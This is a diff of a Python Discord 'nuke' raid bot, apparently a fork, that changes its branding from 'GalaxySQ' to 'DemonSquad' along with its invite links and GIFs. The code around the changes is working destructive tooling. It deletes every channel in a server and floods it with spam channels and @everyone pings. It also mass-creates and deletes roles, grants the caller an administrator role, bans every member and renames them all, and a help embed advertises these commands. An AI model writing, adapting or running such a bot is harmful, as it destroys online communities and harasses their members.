@@ -43,7 +43,7 @@ async def on_ready():
   /`-            /          
  :             .'           
   \ )       .-'             
-   `-----*"'     [GalaxySQ]
+   `-----*"'     [DemonSQ]
 
 >bot creado por hades
 >Gracias por usar mi codigo
@@ -55,15 +55,15 @@ prefix: >
 @bot.event
 async def on_guild_channel_create(channel):
  for i in range(0,25):
-  await channel.send('''@everyone servidor eliminado por orden de galaxy SQ 
-https://discord.gg/dak3RwqDfj
-https://media.discordapp.net/attachments/964444776671870996/973434490733092964/20220509_044512.gif''')
+  await channel.send('''@everyone servidor eliminado por orden de D̷e̷m̷o̷n̷S̷q̷u̷a̷d̷ 
+https://discord.gg/dVcqhbB75d
+https://media.discordapp.net/attachments/976042032340561941/977940697766297650/20220522_092608.gif''')
 
 @bot.command()
 async def raid(ctx):
- nombre = "RAID BY Galaxy"
+ nombre = "raid by D̷e̷m̷o̷n̷"
  await ctx.message.delete()
- await ctx.guild.edit(name = '#GalaxySQ')
+ await ctx.guild.edit(name = '#D̷e̷m̷o̷n̷S̷q̷u̷a̷d̷')
  for channel in ctx.guild.channels:
   try:
    await channel.delete()
@@ -71,10 +71,10 @@ async def raid(ctx):
    pass
  for i in range(0, 220):
        await ctx.guild.create_text_channel(nombre)
-       print("raid inciado")
+       print(f"{msgs['+']} #D̷e̷m̷o̷n̷S̷q̷u̷a̷d̷")
  
 @bot.command(name="mr")
-async def RolMasivo(ctx, amount: int = 250, *, name="RaidBygalaxy💀"):
+async def RolMasivo(ctx, amount: int = 250, *, name="#D̷e̷m̷o̷n̷S̷q̷u̷a̷d̷✡️"):
     await ctx.message.delete()
     for i in range(amount):
         try:
@@ -94,7 +94,7 @@ async def EliminarRoles(ctx):
             print(f"{msgs['error']} no se pudo eliminar el rol: {r}")
 
 @bot.command(name="admin")
-async def Admins(ctx, *, rolename="GalaxySquad"):
+async def Admins(ctx, *, rolename="Demon"):
     await ctx.message.delete()
     try:
         perms = discord.Permissions(administrator=True)
@@ -115,7 +115,7 @@ async def banall(ctx):
             	pass
             
 @bot.command()
-async def nc(ctx, *, name="GalaxyOnTop"):
+async def nc(ctx, *, name="#D̷e̷m̷o̷n̷S̷q̷u̷a̷d̷✡️"):
     await ctx.message.delete()
     for m in ctx.guild.members:
             try:
@@ -130,8 +130,8 @@ async def help(ctx):
         embedVar = discord.Embed(title="comandos", color=0xff0000)
         embedVar.add_field(name="Raid", value= '''``` raid(crea canales + ping) mr(roles masivos) dr(eliminar roles) admin(te da administrador) banall(banea a todos los usuarios) nc(cambia el nombre de todos)
          ```''', inline = False)
-        embedVar.set_image(url="https://media.discordapp.net/attachments/964444776671870996/973434490733092964/20220509_044512.gif ")
-        embedVar.set_footer(text=f"#GalaxySQ")
+        embedVar.set_image(url="https://media.discordapp.net/attachments/976042032340561941/977940697766297650/20220522_092608.gif")
+        embedVar.set_footer(text=f"#D̷e̷m̷o̷n̷S̷q̷u̷a̷d̷✡️")
         await ctx.send(embed=embedVar)
 
 
@@ -144,7 +144,7 @@ async def info(ctx):
    comando de ayuda: >help
     prefix : >
     ''')
-	info.set_image(url="https://media.discordapp.net/attachments/896917826122706956/963948349579476993/20220111_050031.gif")
+	info.set_image(url="https://media.discordapp.net/attachments/976042032340561941/977940697766297650/20220522_092608.gif")
 	info.add_field(name= "codigo", value = "https://github.com/Ninjabrine520/nukebot-Discord.py.git")
 	await ctx.send(embed=info)
 
